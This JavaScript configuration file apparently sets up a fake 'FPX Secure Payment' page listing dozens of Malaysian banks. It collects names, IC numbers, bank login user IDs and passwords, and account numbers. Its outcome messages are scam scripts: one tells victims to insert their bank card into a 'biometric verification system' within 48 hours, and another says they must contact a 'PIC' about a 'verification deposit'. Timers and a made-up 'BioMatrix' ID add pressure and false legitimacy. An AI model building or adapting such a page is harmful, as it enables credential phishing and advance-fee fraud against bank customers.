
export const defaultSettings = {
  brandName: "CYBERSECURITY",
  merchantName: "CYBERSECURITY",
  headerSubtitle: "FPX Secure Payment",
  logoDataUrl: "",
  logoPosition: "left",
  logoSize: 70,
  backgroundColor: "#eef1eb",
  backgroundImageDataUrl: "",
  cardColor: "#ffffff",
  primaryColor: "#0b5bd3",
  successColor: "#0f9f6e",
  failedColor: "#d92d20",
  onHoldColor: "#d97706",
  biomatrixLabel: "BioMatrix ID",
  biomatrixValue: "BioMatrix CR-4557550310",
  labels: {
    paymentTitle: "FPX Secure Payment",
    paymentSubtitle: "Enter the payment information below.",
    name: "Name",
    ic: "IC / Identification No.",
    demoUserId: "Demo User ID",
    demoPassword: "Demo Password",
    continue: "Continue",
    selectBankTitle: "Select Bank",
    accountNumber: "Account Number",
    amount: "Amount (RM)",
    reference: "Reference",
    secureLogin: "Secure Login",
    verification: "Verification",
    processing: "Processing Payment",
    receipt: "Payment Receipt",
    printReceipt: "Print Receipt",
    returnHome: "Return to Home"
  },
  messages: {
    successTitle: "Payment Successful",
    successText: "Your transaction has been successfully processed.",
    failedTitle: "Payment Failed",
    failedText: "The verification process was unsuccessful. Please insert your bank card into the designated biometric verification system to complete KYC verification within 48 hours. Upon successful verification, you may proceed with the transaction.",
    onHoldTitle: "OnHold",
    onHoldText: "As the source of your funds has not yet been verified, please contact your PIC to confirm whether any verification deposit is required before proceeding to the next step."
  },
  timers: {
    failedHours: 48,
    onHoldHours: 12
  }
};

export const defaultBanks = [
  "Affin Bank Berhad","Alliance Bank Malaysia Berhad","AmBank (M) Berhad","Bangkok Bank Berhad",
  "Bank of America Malaysia Berhad","Bank of China (Malaysia) Berhad","BNP Paribas Malaysia Berhad",
  "China Construction Bank (Malaysia) Berhad","CIMB Bank Berhad","Citibank Berhad","Deutsche Bank (Malaysia) Berhad",
  "Hong Leong Bank Berhad","HSBC Bank Malaysia Berhad","Industrial and Commercial Bank of China (Malaysia) Berhad",
  "J.P. Morgan Chase Bank Berhad","Malayan Banking Berhad (Maybank)","Mizuho Bank (Malaysia) Berhad",
  "MUFG Bank (Malaysia) Berhad","OCBC Bank (Malaysia) Berhad","Public Bank Berhad","RHB Bank Berhad",
  "Standard Chartered Bank Malaysia Berhad","Sumitomo Mitsui Banking Corporation Malaysia Berhad",
  "United Overseas Bank (Malaysia) Berhad","Affin Islamic Bank Berhad",
  "Al Rajhi Banking & Investment Corporation (Malaysia) Berhad","Alliance Islamic Bank Berhad","AmBank Islamic Berhad",
  "Bank Islam Malaysia Berhad","Bank Muamalat Malaysia Berhad","CIMB Islamic Bank Berhad","Hong Leong Islamic Bank Berhad",
  "HSBC Amanah Malaysia Berhad","Kuwait Finance House (Malaysia) Berhad","Maybank Islamic Berhad","MBSB Bank Berhad",
  "OCBC Al-Amin Bank Berhad","Public Islamic Bank Berhad","RHB Islamic Bank Berhad","Standard Chartered Saadiq Berhad",
  "P.T Bank Muamalat Indonesia, Tbk","AEON Bank (M) Berhad","Boost Bank Berhad","GX Bank Berhad",
  "KAF Digital Bank Berhad","YTL Digital Bank Berhad (Ryt Bank)","Affin Hwang Investment Bank Berhad",
  "AmInvestment Bank Berhad","CIMB Investment Bank Berhad","Hong Leong Investment Bank Berhad",
  "KAF Investment Bank Berhad","Kenanga Investment Bank Berhad","Maybank Investment Bank Berhad",
  "MBSB Investment Bank Berhad","Public Investment Bank Berhad","RHB Investment Bank Berhad",
  "Bank Kerjasama Rakyat Malaysia Berhad (Bank Rakyat)","Bank Pembangunan Malaysia Berhad",
  "Bank Pertanian Malaysia Berhad (Agrobank)","Bank Simpanan Nasional",
  "Export-Import Bank of Malaysia Berhad (EXIM Bank)","Small Medium Enterprise Development Bank Malaysia Berhad (SME Bank)"
];
